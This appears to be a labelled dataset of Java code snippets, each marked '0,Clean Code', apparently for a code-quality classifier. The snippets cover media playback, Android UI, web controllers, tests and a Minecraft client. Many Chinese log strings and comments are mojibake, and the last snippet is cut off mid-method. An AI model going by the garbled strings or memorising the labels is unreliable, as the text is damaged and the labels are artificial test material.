"@Override public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent,int viewType){
  HintDialogCell cell=new HintDialogCell(mContext,drawChecked,resourcesProvider);
  if (showPremiumBlock) {
    cell.showPremiumBlocked();
  }
  cell.setLayoutParams(new RecyclerView.LayoutParams(AndroidUtilities.dp(80),AndroidUtilities.dp(86)));
  return new RecyclerListView.Holder(cell);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@3c78af79",0,Clean Code
"private static void assertFixedSelection(TrackSelection selection,TrackGroupArray trackGroups,Format expectedFormat){
  int trackGroupIndex=-1;
  for (int i=0; i < trackGroups.length; i++) {
    int expectedTrack=trackGroups.get(i).indexOf(expectedFormat);
    if (expectedTrack != -1) {
      assertThat(trackGroupIndex).isEqualTo(-1);
      assertFixedSelection(selection,trackGroups.get(i),expectedTrack);
      trackGroupIndex=i;
    }
  }
  assertThat(trackGroupIndex).isNotEqualTo(-1);
}
private static void assertFixedSelection(TrackSelection selection,TrackGroup expectedTrackGroup,int expectedTrack){
  assertThat(selection).isInstanceOf(FixedTrackSelection.class);
  assertThat(selection.getTrackGroup()).isEqualTo(expectedTrackGroup);
  assertThat(selection.length()).isEqualTo(1);
  assertThat(selection.getIndexInTrackGroup(0)).isEqualTo(expectedTrack);
  assertThat(selection.getFormat(0)).isSameAs(expectedTrackGroup.getFormat(selection.getIndexInTrackGroup(0)));
}",0,Clean Code
"@Override public StreamInfo getDownLoadInfo(String deviceId,String channelId,String stream){
  InviteInfo inviteInfo=inviteStreamService.getInviteInfo(InviteSessionType.DOWNLOAD,deviceId,channelId,stream);
  if (inviteInfo == null || inviteInfo.getStreamInfo() == null) {
    logger.warn(""[鑾峰彇涓嬭浇杩涘害] 鏈煡璇㈠埌褰曞儚涓嬭浇鐨勪俊鎭�"");
    return null;
  }
  if (inviteInfo.getStreamInfo().getProgress() == 1) {
    return inviteInfo.getStreamInfo();
  }
  String mediaServerId=inviteInfo.getStreamInfo().getMediaServerId();
  MediaServer mediaServerItem=mediaServerService.getOne(mediaServerId);
  if (mediaServerItem == null) {
    logger.warn(""[鑾峰彇涓嬭浇杩涘害] 鏌ヨ褰曞儚淇℃伅鏃跺彂鐜拌妭鐐逛笉瀛樺湪"");
    return null;
  }
  SsrcTransaction ssrcTransaction=streamSession.getSsrcTransaction(deviceId,channelId,null,stream);
  if (ssrcTransaction == null) {
    logger.warn(""[鑾峰彇涓嬭浇杩涘害] 涓嬭浇宸茬粨鏉�"");
    return null;
  }
  String app=""rtp"";
  MediaInfo mediaInfo=mediaServerService.getMediaInfo(mediaServerItem,app,stream);
  if (mediaInfo == null) {
    logger.warn(""[鑾峰彇涓嬭浇杩涘害] 鏌ヨ杩涘害澶辫触, 鑺傜偣Id锛� {}锛� {}/{}"",mediaServerId,app,stream);
    return null;
  }
  if (mediaInfo.getDuration() == 0) {
    inviteInfo.getStreamInfo().setProgress(0);
  }
 else {
    String startTime=inviteInfo.getStreamInfo().getStartTime();
    String endTime=inviteInfo.getStreamInfo().getEndTime();
    long start=DateUtil.yyyy_MM_dd_HH_mm_ssToTimestamp(startTime);
    long end=DateUtil.yyyy_MM_dd_HH_mm_ssToTimestamp(endTime);
    BigDecimal currentCount=new BigDecimal(mediaInfo.getDuration());
    BigDecimal totalCount=new BigDecimal((end - start) * 1000);
    BigDecimal divide=currentCount.divide(totalCount,2,RoundingMode.HALF_UP);
    double process=divide.doubleValue();
    if (process > 0.999) {
      process=1.0;
    }
    inviteInfo.getStreamInfo().setProgress(process);
  }
  inviteStreamService.updateInviteInfo(inviteInfo);
  return inviteInfo.getStreamInfo();
}",0,Clean Code
"/** 
 * @TCDescription : 澶氱鎴锋敞鍐孖P锛宲ort鐩稿悓鐨勫疄渚�
 * @TestStep :
 * @ExpectResult :
 */
@Test public void multipleTenant_selectInstances() throws Exception {
  String serviceName=randomDomainName();
  naming1.registerInstance(serviceName,TEST_IP_4_DOM_1,TEST_PORT);
  naming2.registerInstance(serviceName,""22.22.22.22"",80);
  naming.registerInstance(serviceName,TEST_IP_4_DOM_1,TEST_PORT);
  naming.registerInstance(serviceName,""44.44.44.44"",8888);
  TimeUnit.SECONDS.sleep(5L);
  List<Instance> instances=naming1.selectInstances(serviceName,true);
  Assert.assertEquals(1,instances.size());
  Assert.assertEquals(TEST_IP_4_DOM_1,instances.get(0).getIp());
  Assert.assertEquals(TEST_PORT,instances.get(0).getPort());
  instances=naming2.selectInstances(serviceName,false);
  Assert.assertEquals(0,instances.size());
  instances=naming.selectInstances(serviceName,true);
  Assert.assertEquals(2,instances.size());
}",0,Clean Code
"public void reset(int captionMode){
  this.captionMode=captionMode;
  cueStyles.clear();
  rolledUpCaptions.clear();
  captionStringBuilder.setLength(0);
  row=BASE_ROW;
  indent=0;
  tabOffset=0;
}
public void reset(){
  clear();
  defined=false;
  visible=false;
  priority=DEFAULT_PRIORITY;
  relativePositioning=false;
  verticalAnchor=0;
  horizontalAnchor=0;
  anchorId=0;
  rowCount=MAXIMUM_ROW_COUNT;
  rowLock=true;
  justification=JUSTIFICATION_LEFT;
  windowStyleId=0;
  penStyleId=0;
  windowFillColor=COLOR_SOLID_BLACK;
  foregroundColor=COLOR_SOLID_WHITE;
  backgroundColor=COLOR_SOLID_BLACK;
}",0,Clean Code
"@Override public void close() throws AssetDataSourceException {
  uri=null;
  try {
    if (inputStream != null) {
      inputStream.close();
    }
  }
 catch (  IOException e) {
    throw new AssetDataSourceException(e);
  }
 finally {
    inputStream=null;
    if (opened) {
      opened=false;
      transferEnded();
    }
  }
}
",0,Clean Code
"/** 
 * Returns the appropriate  {@code get-field} rop for the giventype. The result is a shared instance.
 * @param type {@code non-null;} type of the field in question
 * @return {@code non-null;} an appropriate instance
 */
public static Rop opGetField(TypeBearer type){
switch (type.getBasicType()) {
case Type.BT_INT:
    return GET_FIELD_INT;
case Type.BT_LONG:
  return GET_FIELD_LONG;
case Type.BT_FLOAT:
return GET_FIELD_FLOAT;
case Type.BT_DOUBLE:
return GET_FIELD_DOUBLE;
case Type.BT_OBJECT:
return GET_FIELD_OBJECT;
case Type.BT_BOOLEAN:
return GET_FIELD_BOOLEAN;
case Type.BT_BYTE:
return GET_FIELD_BYTE;
case Type.BT_CHAR:
return GET_FIELD_CHAR;
case Type.BT_SHORT:
return GET_FIELD_SHORT;
}
return throwBadType(type);
}
",0,Clean Code
"@Override public void onReceive(Context context,Intent intent){
  if (Intent.ACTION_PACKAGE_ADDED.equals(intent.getAction())) {
    boolean newInstall=!intent.getBooleanExtra(Intent.EXTRA_REPLACING,false);
    String packageName=intent.getData().getSchemeSpecificPart();
    if (newInstall && Prefs.blockNewApps(mPrefs)) {
      if (!mBlocklist.addApp(packageName))       return;
      mBlocklist.save();
      reloadBlocklist();
      AppDescriptor app=AppsResolver.resolveInstalledApp(getPackageManager(),packageName,0);
      String label=(app != null) ? app.getName() : packageName;
      Log.i(TAG,""Blocking newly installed app: "" + packageName + ((app != null) ? "" - "" + app.getUid() : """"));
      PendingIntent pi=PendingIntent.getActivity(CaptureService.this,0,new Intent(CaptureService.this,FirewallActivity.class),Utils.getIntentFlags(0));
      PendingIntent unblockIntent=PendingIntent.getBroadcast(CaptureService.this,0,new Intent(CaptureService.this,ActionReceiver.class).putExtra(ActionReceiver.EXTRA_UNBLOCK_APP,packageName),Utils.getIntentFlags(PendingIntent.FLAG_UPDATE_CURRENT));
      NotificationManagerCompat man=NotificationManagerCompat.from(context);
      if (man.areNotificationsEnabled()) {
        Notification notification=new NotificationCompat.Builder(CaptureService.this,NOTIFY_CHAN_OTHER).setContentIntent(pi).setSmallIcon(R.drawable.ic_logo).setColor(ContextCompat.getColor(CaptureService.this,R.color.colorPrimary)).setVisibility(NotificationCompat.VISIBILITY_PUBLIC).setCategory(NotificationCompat.CATEGORY_STATUS).setContentTitle(getString(R.string.app_blocked)).setContentText(getString(R.string.app_blocked_info,label)).setAutoCancel(true).addAction(R.drawable.ic_check_solid,getString(R.string.action_unblock),unblockIntent).build();
        man.notify(NOTIFY_ID_APP_BLOCKED,notification);
      }
    }
  }
}",0,Clean Code
"@Test public void testSinglePeriod() throws Exception {
  FakeMediaSource mediaSource=new FakeMediaSource(SINGLE_PERIOD_TIMELINE,null,Builder.VIDEO_FORMAT,Builder.AUDIO_FORMAT);
  TestAnalyticsListener listener=runAnalyticsTest(mediaSource);
  populateEventIds(SINGLE_PERIOD_TIMELINE);
  assertThat(listener.getEvents(EVENT_PLAYER_STATE_CHANGED)).containsExactly(WINDOW_0,WINDOW_0,period0,period0);
  assertThat(listener.getEvents(EVENT_TIMELINE_CHANGED)).containsExactly(WINDOW_0);
  assertThat(listener.getEvents(EVENT_LOADING_CHANGED)).containsExactly(period0,period0);
  assertThat(listener.getEvents(EVENT_TRACKS_CHANGED)).containsExactly(period0);
  assertThat(listener.getEvents(EVENT_LOAD_STARTED)).containsExactly(WINDOW_0,period0);
  assertThat(listener.getEvents(EVENT_LOAD_COMPLETED)).containsExactly(WINDOW_0,period0);
  assertThat(listener.getEvents(EVENT_DOWNSTREAM_FORMAT_CHANGED)).containsExactly(period0,period0);
  assertThat(listener.getEvents(EVENT_MEDIA_PERIOD_CREATED)).containsExactly(period0);
  assertThat(listener.getEvents(EVENT_READING_STARTED)).containsExactly(period0);
  assertThat(listener.getEvents(EVENT_DECODER_ENABLED)).containsExactly(period0,period0);
  assertThat(listener.getEvents(EVENT_DECODER_INIT)).containsExactly(period0,period0);
  assertThat(listener.getEvents(EVENT_DECODER_FORMAT_CHANGED)).containsExactly(period0,period0);
  assertThat(listener.getEvents(EVENT_AUDIO_SESSION_ID)).containsExactly(period0);
  assertThat(listener.getEvents(EVENT_DROPPED_VIDEO_FRAMES)).containsExactly(period0);
  assertThat(listener.getEvents(EVENT_VIDEO_SIZE_CHANGED)).containsExactly(period0);
  assertThat(listener.getEvents(EVENT_RENDERED_FIRST_FRAME)).containsExactly(period0);
  listener.assertNoMoreEvents();
}",0,Clean Code
"public static boolean handleClick(Level level,BlockPos pos,BlockState state,BlockHitResult result){
  Pair<Direction,Action> dirPair=getDirectionAndAction(result,level,pos);
  if (dirPair == null)   return false;
  if (level.isClientSide)   return true;
  if (!state.getValue(GirderBlock.X) && !state.getValue(GirderBlock.Z))   return false;
  Direction dir=dirPair.getFirst();
  BlockPos otherPos=pos.relative(dir);
  BlockState other=level.getBlockState(otherPos);
  if (dir == Direction.UP) {
    level.setBlock(pos,postProcess(state.cycle(GirderBlock.TOP)),2 | 16);
    if (dirPair.getSecond() == Action.PAIR && AllBlocks.METAL_GIRDER.has(other))     level.setBlock(otherPos,postProcess(other.cycle(GirderBlock.BOTTOM)),2 | 16);
    return true;
  }
  if (dir == Direction.DOWN) {
    level.setBlock(pos,postProcess(state.cycle(GirderBlock.BOTTOM)),2 | 16);
    if (dirPair.getSecond() == Action.PAIR && AllBlocks.METAL_GIRDER.has(other))     level.setBlock(otherPos,postProcess(other.cycle(GirderBlock.TOP)),2 | 16);
    return true;
  }
  return true;
}",0,Clean Code
"private int getBestWeapon(EntityType<?> group){
  int slotS=mc.player.getInventory().selectedSlot;
  int slotA=mc.player.getInventory().selectedSlot;
  double damageS=0;
  double damageA=0;
  double currentDamageS;
  double currentDamageA;
  for (int i=0; i < 9; i++) {
    ItemStack stack=mc.player.getInventory().getStack(i);
    if (stack.getItem() instanceof SwordItem && (!antiBreak.get() || (stack.getMaxDamage() - stack.getDamage()) > 10)) {
      currentDamageS=swordItem.getMaterial().getAttackDamage() + EnchantmentHelper.getAttackDamage(stack,group) + 2;
      if (currentDamageS > damageS) {
        damageS=currentDamageS;
        slotS=i;
      }
    }
 else     if (stack.getItem() instanceof AxeItem && (!antiBreak.get() || (stack.getMaxDamage() - stack.getDamage()) > 10)) {
      currentDamageA=axeItem.getMaterial().getAttackDamage() + EnchantmentHelper.getAttackDamage(stack,group) + 2;
      if (currentDamageA > damageA) {
        damageA=currentDamageA;
        slotA=i;
      }
    }
  }
  if (weapon.get() == Weapon.Sword && threshold.get() > damageA - damageS)   return slotS;
 else   if (weapon.get() == Weapon.Axe && threshold.get() > damageS - damageA)   return slotA;
 else   if (weapon.get() == Weapon.Sword && threshold.get() < damageA - damageS)   return slotA;
 else   if (weapon.get() == Weapon.Axe && threshold.get() < damageS - damageA)   return slotS;
 else   return mc.player.getInventory().selectedSlot;
}",0,Clean Code
"private void readLogsFromFile(){
  new Thread(() -> {
    try (FileInputStream fis=openFileInput(""logs.txt"")){
      BufferedReader reader=new BufferedReader(new InputStreamReader(fis));
      StringBuilder sb=new StringBuilder();
      String line;
      while ((line=reader.readLine()) != null) {
        sb.append(line).append(""\n"");
      }
      String finalLog=sb.toString();
      runOnUiThread(() -> {
        logs.setText(finalLog);
        if (!isUserScrollingUp) {
          logScrollView.post(() -> logScrollView.fullScroll(ScrollView.FOCUS_DOWN));
        }
      }
);
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
).start();
}
",0,Clean Code
"public static synchronized void submitProgress(String progressRecord,int progress,int resid,Object... va){
  ProgressState progressState=sProgressStates.get(progressRecord);
  boolean shouldCallStarted=progressState == null;
  boolean shouldCallEnded=resid == -1 && progress == -1;
  if (shouldCallEnded) {
    shouldCallStarted=false;
    sProgressStates.remove(progressRecord);
    updateTaskCount();
  }
 else   if (shouldCallStarted) {
    sProgressStates.put(progressRecord,(progressState=new ProgressState()));
    updateTaskCount();
  }
  if (progressState != null) {
    progressState.progress=progress;
    progressState.resid=resid;
    progressState.varArg=va;
  }
  List<ProgressListener> progressListeners=sProgressListeners.get(progressRecord);
  if (progressListeners != null)   for (  ProgressListener listener : progressListeners) {
    if (shouldCallStarted)     listener.onProgressStarted();
 else     if (shouldCallEnded)     listener.onProgressEnded();
 else     listener.onProgressUpdated(progress,resid,va);
  }
}",0,Clean Code
"/** 
 * Removes cast from string. <p>For example,  {@code x > CAST('2015-01-07' AS DATE)}becomes  {@code x > '2015-01-07'}.
 */
private static RexNode stripCastFromString(RexNode node){
switch (node.getKind()) {
case EQUALS:
case IS_NOT_DISTINCT_FROM:
case NOT_EQUALS:
case GREATER_THAN:
case GREATER_THAN_OR_EQUAL:
case LESS_THAN:
case LESS_THAN_OR_EQUAL:
    final RexCall call=(RexCall)node;
  final RexNode o0=call.operands.get(0);
final RexNode o1=call.operands.get(1);
if (o0.getKind() == SqlKind.CAST && o1.getKind() != SqlKind.CAST) {
final RexNode o0b=((RexCall)o0).getOperands().get(0);
switch (o0b.getType().getSqlTypeName()) {
case CHAR:
case VARCHAR:
  return call.clone(call.getType(),ImmutableList.of(o0b,o1));
}
}
if (o1.getKind() == SqlKind.CAST && o0.getKind() != SqlKind.CAST) {
final RexNode o1b=((RexCall)o1).getOperands().get(0);
switch (o1b.getType().getSqlTypeName()) {
case CHAR:
case VARCHAR:
return call.clone(call.getType(),ImmutableList.of(o0,o1b));
}
}
}
return node;
}",0,Clean Code
"private void maybeInitExtraTracks(){
  if (emsgTrackOutputs == null) {
    emsgTrackOutputs=new TrackOutput[2];
    int emsgTrackOutputCount=0;
    if (additionalEmsgTrackOutput != null) {
      emsgTrackOutputs[emsgTrackOutputCount++]=additionalEmsgTrackOutput;
    }
    if ((flags & FLAG_ENABLE_EMSG_TRACK) != 0) {
      emsgTrackOutputs[emsgTrackOutputCount++]=extractorOutput.track(trackBundles.size(),C.TRACK_TYPE_METADATA);
    }
    emsgTrackOutputs=Arrays.copyOf(emsgTrackOutputs,emsgTrackOutputCount);
    for (    TrackOutput eventMessageTrackOutput : emsgTrackOutputs) {
      eventMessageTrackOutput.format(EMSG_FORMAT);
    }
  }
  if (cea608TrackOutputs == null) {
    cea608TrackOutputs=new TrackOutput[closedCaptionFormats.size()];
    for (int i=0; i < cea608TrackOutputs.length; i++) {
      TrackOutput output=extractorOutput.track(trackBundles.size() + 1 + i,C.TRACK_TYPE_TEXT);
      output.format(closedCaptionFormats.get(i));
      cea608TrackOutputs[i]=output;
    }
  }
}",0,Clean Code
"/** 
 * Attempts to seek to the specified position in microseconds.
 * @param positionUs The seek position in microseconds.
 * @param forceReset If true then a reset is forced (i.e. in-buffer seeking is disabled).
 * @return Whether the wrapper was reset, meaning the wrapped sample queues were reset. If false,an in-buffer seek was performed.
 */
public boolean seekToUs(long positionUs,boolean forceReset){
  lastSeekPositionUs=positionUs;
  if (isPendingReset()) {
    pendingResetPositionUs=positionUs;
    return true;
  }
  if (sampleQueuesBuilt && !forceReset && seekInsideBufferUs(positionUs)) {
    return false;
  }
  pendingResetPositionUs=positionUs;
  loadingFinished=false;
  mediaChunks.clear();
  if (loader.isLoading()) {
    loader.cancelLoading();
  }
 else {
    loader.clearFatalError();
    resetSampleQueues();
  }
  return true;
}
",0,Clean Code
"/** 
 * @param uuid The {@link UUID} of the DRM scheme, or {@link C#UUID_NIL} if the data isuniversal (i.e. applies to all schemes).
 * @param mimeType See {@link #mimeType}.
 * @param data See {@link #data}.
 */
public SchemeData(UUID uuid,String mimeType,@Nullable byte[] data){
  this(uuid,mimeType,data,false);
}
/** 
 * @param uuid The {@link UUID} of the DRM scheme, or {@link C#UUID_NIL} if the data isuniversal (i.e. applies to all schemes).
 * @param mimeType See {@link #mimeType}.
 * @param data See {@link #data}.
 * @param requiresSecureDecryption See {@link #requiresSecureDecryption}.
 */
public SchemeData(UUID uuid,String mimeType,@Nullable byte[] data,boolean requiresSecureDecryption){
  this(uuid,null,mimeType,data,requiresSecureDecryption);
}
/** 
 * @param uuid The {@link UUID} of the DRM scheme, or {@link C#UUID_NIL} if the data isuniversal (i.e. applies to all schemes).
 * @param licenseServerUrl See {@link #licenseServerUrl}.
 * @param mimeType See {@link #mimeType}.
 * @param data See {@link #data}.
 * @param requiresSecureDecryption See {@link #requiresSecureDecryption}.
 */
public SchemeData(UUID uuid,@Nullable String licenseServerUrl,String mimeType,@Nullable byte[] data,boolean requiresSecureDecryption){
  this.uuid=Assertions.checkNotNull(uuid);
  this.licenseServerUrl=licenseServerUrl;
  this.mimeType=Assertions.checkNotNull(mimeType);
  this.data=data;
  this.requiresSecureDecryption=requiresSecureDecryption;
}
SchemeData(Parcel in){
  uuid=new UUID(in.readLong(),in.readLong());
  licenseServerUrl=in.readString();
  mimeType=Util.castNonNull(in.readString());
  data=in.createByteArray();
  requiresSecureDecryption=in.readByte() != 0;
}",0,Clean Code
"private void onRestoreKeyboardState(final int autoCapsFlags,final int recapitalizeMode){
  final SavedKeyboardState state=mSavedKeyboardState;
  if (DEBUG_EVENT) {
    Log.d(TAG,""onRestoreKeyboardState: saved="" + state + "" ""+ stateToString(autoCapsFlags,recapitalizeMode));
  }
  mPrevMainKeyboardWasShiftLocked=state.mIsAlphabetShiftLocked;
  if (state.mMode == MODE_ALPHABET) {
    setAlphabetKeyboard(autoCapsFlags,recapitalizeMode);
    setShiftLocked(state.mIsAlphabetShiftLocked);
    if (!state.mIsAlphabetShiftLocked) {
      setShifted(state.mShiftMode);
    }
    return;
  }
  if (state.mMode == MODE_EMOJI) {
    setEmojiKeyboard();
    return;
  }
  if (state.mMode == MODE_CLIPBOARD) {
    setClipboardKeyboard();
    return;
  }
  if (state.mMode == MODE_NUMPAD) {
    setNumpadKeyboard();
    return;
  }
  if (state.mShiftMode == MANUAL_SHIFT) {
    setSymbolsShiftedKeyboard();
  }
 else {
    setSymbolsKeyboard();
  }
}
",0,Clean Code
"@Override public void onSensorChanged(SensorEvent event){
  int rotation=wm.getDefaultDisplay().getRotation();
  float x=event.values[0] / SensorManager.GRAVITY_EARTH;
  float y=event.values[1] / SensorManager.GRAVITY_EARTH;
  float z=event.values[2] / SensorManager.GRAVITY_EARTH;
  pitch=(float)(Math.atan2(x,Math.sqrt(y * y + z * z)) / Math.PI * 2.0);
  roll=(float)(Math.atan2(y,Math.sqrt(x * x + z * z)) / Math.PI * 2.0);
switch (rotation) {
case Surface.ROTATION_0:
    break;
case Surface.ROTATION_90:
{
    float tmp=pitch;
    pitch=roll;
    roll=tmp;
    break;
  }
case Surface.ROTATION_180:
roll=-roll;
pitch=-pitch;
break;
case Surface.ROTATION_270:
{
float tmp=-pitch;
pitch=roll;
roll=tmp;
break;
}
}
rollBuffer[bufferOffset]=roll;
pitchBuffer[bufferOffset]=pitch;
bufferOffset=(bufferOffset + 1) % rollBuffer.length;
roll=pitch=0;
for (int i=0; i < rollBuffer.length; i++) {
roll+=rollBuffer[i];
pitch+=pitchBuffer[i];
}
roll/=rollBuffer.length;
pitch/=rollBuffer.length;
if (roll > 1f) {
roll=2f - roll;
}
 else if (roll < -1f) {
roll=-2f - roll;
}
updateEffects();
}",0,Clean Code
"private static void parseStyleDeclaration(ParsableByteArray input,WebvttCssStyle style,StringBuilder stringBuilder){
  skipWhitespaceAndComments(input);
  String property=parseIdentifier(input,stringBuilder);
  if ("""".equals(property)) {
    return;
  }
  if (!"":"".equals(parseNextToken(input,stringBuilder))) {
    return;
  }
  skipWhitespaceAndComments(input);
  String value=parsePropertyValue(input,stringBuilder);
  if (value == null || """".equals(value)) {
    return;
  }
  int position=input.getPosition();
  String token=parseNextToken(input,stringBuilder);
  if ("";"".equals(token)) {
  }
 else   if (RULE_END.equals(token)) {
    input.setPosition(position);
  }
 else {
    return;
  }
  if (""color"".equals(property)) {
    style.setFontColor(ColorParser.parseCssColor(value));
  }
 else   if (PROPERTY_BGCOLOR.equals(property)) {
    style.setBackgroundColor(ColorParser.parseCssColor(value));
  }
 else   if (PROPERTY_TEXT_DECORATION.equals(property)) {
    if (VALUE_UNDERLINE.equals(value)) {
      style.setUnderline(true);
    }
  }
 else   if (PROPERTY_FONT_FAMILY.equals(property)) {
    style.setFontFamily(value);
  }
 else   if (PROPERTY_FONT_WEIGHT.equals(property)) {
    if (VALUE_BOLD.equals(value)) {
      style.setBold(true);
    }
  }
 else   if (PROPERTY_FONT_STYLE.equals(property)) {
    if (VALUE_ITALIC.equals(value)) {
      style.setItalic(true);
    }
  }
}
",0,Clean Code
"@GetMapping(""/dashboard"") public Result dashboard(){
  int todayPV=dashboardService.countVisitLogByToday();
  int todayUV=redisService.countBySet(RedisKeyConstants.IDENTIFICATION_SET);
  int blogCount=dashboardService.getBlogCount();
  int commentCount=dashboardService.getCommentCount();
  Map<String,List> categoryBlogCountMap=dashboardService.getCategoryBlogCountMap();
  Map<String,List> tagBlogCountMap=dashboardService.getTagBlogCountMap();
  Map<String,List> visitRecordMap=dashboardService.getVisitRecordMap();
  List<CityVisitor> cityVisitorList=dashboardService.getCityVisitorList();
  Map<String,Object> map=new HashMap<>(16);
  map.put(""pv"",todayPV);
  map.put(""uv"",todayUV);
  map.put(""blogCount"",blogCount);
  map.put(""commentCount"",commentCount);
  map.put(""category"",categoryBlogCountMap);
  map.put(""tag"",tagBlogCountMap);
  map.put(""visitRecord"",visitRecordMap);
  map.put(""cityVisitor"",cityVisitorList);
  return Result.ok(""鑾峰彇鎴愬姛"",map);
}",0,Clean Code
"/** 
 * Asserts that an extractor behaves correctly given valid input data. Can only be used from Robolectric tests. <ul> <li>Calls  {@link Extractor#seek(long,long)} and {@link Extractor#release()} without calling{@link Extractor#init(ExtractorOutput)} to check these calls do not fail.<li>Calls  {@link #assertOutput(Extractor,String,byte[],Context,boolean,boolean,boolean,boolean)} with all possible combinations of ""simulate"" parameters.</ul>
 * @param factory An {@link ExtractorFactory} which creates instances of the {@link Extractor}class which is to be tested.
 * @param file The path to the input sample.
 * @throws IOException If reading from the input fails.
 * @throws InterruptedException If interrupted while reading from the input.
 */
public static void assertBehavior(ExtractorFactory factory,String file) throws IOException, InterruptedException {
  Extractor extractor=factory.create();
  extractor.seek(0,0);
  extractor.release();
  byte[] fileData=TestUtil.getByteArray(ApplicationProvider.getApplicationContext(),file);
  assertOutput(factory,file,fileData,ApplicationProvider.getApplicationContext());
}
/** 
 * Asserts that an extractor behaves correctly given valid input data: <ul> <li>Calls  {@link Extractor#seek(long,long)} and {@link Extractor#release()} without calling{@link Extractor#init(ExtractorOutput)} to check these calls do not fail.<li>Calls  {@link #assertOutput(Extractor,String,byte[],Context,boolean,boolean,boolean,boolean)} with all possible combinations of ""simulate"" parameters.</ul>
 * @param factory An {@link ExtractorFactory} which creates instances of the {@link Extractor}class which is to be tested.
 * @param file The path to the input sample.
 * @param context To be used to load the sample file.
 * @throws IOException If reading from the input fails.
 * @throws InterruptedException If interrupted while reading from the input.
 */
public static void assertBehavior(ExtractorFactory factory,String file,Context context) throws IOException, InterruptedException {
  Extractor extractor=factory.create();
  extractor.seek(0,0);
  extractor.release();
  byte[] fileData=TestUtil.getByteArray(context,file);
  assertOutput(factory,file,fileData,context);
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.test.protos.MockOutputInfoProto)) {
    return super.equals(obj);
  }
  org.tribuo.test.protos.MockOutputInfoProto other=(org.tribuo.test.protos.MockOutputInfoProto)obj;
  if (!getLabelList().equals(other.getLabelList()))   return false;
  if (!getCountsList().equals(other.getCountsList()))   return false;
  if (!getIdList().equals(other.getIdList()))   return false;
  if (getUnknownCount() != other.getUnknownCount())   return false;
  if (getLabelCounter() != other.getLabelCounter())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"/** 
 * 鍦ㄦ湰鏈鸿繍琛屽懡浠わ紝骞惰繑鍥炶繍琛岀粨鏋�
 * @param command 鍛戒护
 * @param envMap  鐜鍙橀噺瀛楀吀
 * @return 鍛戒护鎵ц缁撴灉
 */
public static ProcessResult runLocalCommand(String command,Map<String,String> envMap) throws InterruptedException, TimeoutException, IOException {
  return new ProcessExecutor().command(getBashCommand(command)).environment(envMap).redirectOutput(Slf4jStream.ofCaller().asInfo()).redirectErrorStream(true).timeout(120,TimeUnit.MINUTES).stopper(DestroyProcessStopper.INSTANCE).readOutput(true).execute();
}
/** 
 * 鍦ㄦ湰鏈鸿繍琛屽懡浠わ紝骞惰繑鍥炶繍琛岀粨鏋�
 * @param command 鍛戒护
 * @return 鍛戒护鎵ц缁撴灉
 */
public static ProcessResult runLocalCommand(String command) throws InterruptedException, IOException, TimeoutException {
  return runLocalCommand(command,new HashMap<>());
}",0,Clean Code
"@BackendPermission(slug=BPermissionConstant.ADMIN_LOG) @GetMapping(""/index"") @Log(title=""绠＄悊鍛樻棩蹇�-鍒楄〃"",businessType=BusinessTypeConstant.GET) public JsonResponse index(@RequestParam HashMap<String,Object> params){
  Integer page=MapUtils.getInteger(params,""page"",1);
  Integer size=MapUtils.getInteger(params,""size"",10);
  String sortField=MapUtils.getString(params,""sort_field"");
  String sortAlgo=MapUtils.getString(params,""sort_algo"");
  Integer adminId=MapUtils.getInteger(params,""admin_id"");
  String adminName=MapUtils.getString(params,""admin_name"");
  String module=MapUtils.getString(params,""module"");
  String title=MapUtils.getString(params,""title"");
  Integer opt=MapUtils.getInteger(params,""opt"");
  String startTime=MapUtils.getString(params,""start_time"");
  String endTime=MapUtils.getString(params,""end_time"");
  AdminLogPaginateFiler filter=new AdminLogPaginateFiler();
  if (backendBus.isSuperAdmin()) {
    filter.setAdminId(adminId);
  }
 else {
    filter.setAdminId(BCtx.getId());
  }
  filter.setAdminName(adminName);
  filter.setModule(module);
  filter.setTitle(title);
  filter.setOpt(opt);
  filter.setStartTime(startTime);
  filter.setEndTime(endTime);
  filter.setSortField(sortField);
  filter.setSortAlgo(sortAlgo);
  PaginationResult<AdminLog> result=adminLogService.paginate(page,size,filter);
  HashMap<String,Object> data=new HashMap<>();
  data.put(""data"",result.getData());
  data.put(""total"",result.getTotal());
  return JsonResponse.data(data);
}",0,Clean Code
"@BackendPermission(slug=BPermissionConstant.DEPARTMENT_CUD) @GetMapping(""/{id}/destroy"") @Log(title=""閮ㄩ棬-鎵归噺鍒犻櫎"",businessType=BusinessTypeConstant.DELETE) public JsonResponse preDestroy(@PathVariable Integer id){
  if (ldapBus.enabledLDAP()) {
    return JsonResponse.error(""宸插惎鐢↙DAP鏈嶅姟锛岀姝㈡坊鍔犻儴闂�"");
  }
  List<Integer> courseIds=courseDepartmentService.getCourseIdsByDepId(id);
  List<Integer> userIds=departmentService.getUserIdsByDepId(id);
  HashMap<String,Object> data=new HashMap<>();
  data.put(""courses"",new ArrayList<>());
  data.put(""users"",new ArrayList<>());
  data.put(""children"",departmentService.listByParentId(id));
  if (courseIds != null && !courseIds.isEmpty()) {
    data.put(""courses"",courseService.chunks(courseIds,new ArrayList<>(){
{
        add(""id"");
        add(""title"");
      }
    }
));
  }
  if (userIds != null && !userIds.isEmpty()) {
    data.put(""users"",userService.chunks(userIds,new ArrayList<>(){
{
        add(""id"");
        add(""name"");
        add(""avatar"");
      }
    }
));
  }
  return JsonResponse.data(data);
}
",0,Clean Code
"public void setupWithViewPager(@Nullable ViewPager viewPager){
  setupWithViewPager(viewPager,true);
}
public void setupWithViewPager(@Nullable ViewPager viewPager,boolean useAdapterTitle){
  setupWithViewPager(viewPager,useAdapterTitle,true);
}
/** 
 * @param viewPager       需要关联的 ViewPager。
 * @param useAdapterTitle 自动根据ViewPager的adapter.getTitle取值。
 * @param autoRefresh     adapter有更改时，刷新TabSegment。
 */
public void setupWithViewPager(@Nullable final ViewPager viewPager,boolean useAdapterTitle,boolean autoRefresh){
  if (mViewPager != null) {
    if (mOnPageChangeListener != null) {
      mViewPager.removeOnPageChangeListener(mOnPageChangeListener);
    }
    if (mAdapterChangeListener != null) {
      mViewPager.removeOnAdapterChangeListener(mAdapterChangeListener);
    }
  }
  if (mViewPagerSelectedListener != null) {
    removeOnTabSelectedListener(mViewPagerSelectedListener);
    mViewPagerSelectedListener=null;
  }
  if (viewPager != null) {
    mViewPager=viewPager;
    if (mOnPageChangeListener == null) {
